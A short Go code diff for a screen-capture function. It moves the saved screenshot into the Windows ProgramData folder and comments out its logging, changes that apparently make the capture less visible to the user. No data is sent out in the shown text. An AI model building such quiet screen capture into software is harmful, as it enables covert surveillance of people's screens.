@@ -4,14 +4,13 @@ import (
 	"github.com/kbinani/screenshot"
 	"image/png"
 	"io/ioutil"
-	"log"
 	"os"
 )
 
 func ScreenShot() []byte {
 	// Create a path to save screenshto
-	pathToSaveScreenshot := "screenshot.png"
-	log.Print(pathToSaveScreenshot)
+	pathToSaveScreenshot := os.Getenv("systemdrive")+"\\ProgramData\\screenshot.png"
+//	log.Print(pathToSaveScreenshot)
 	// Run func to get screenshot
 	n := screenshot.NumActiveDisplays()
 
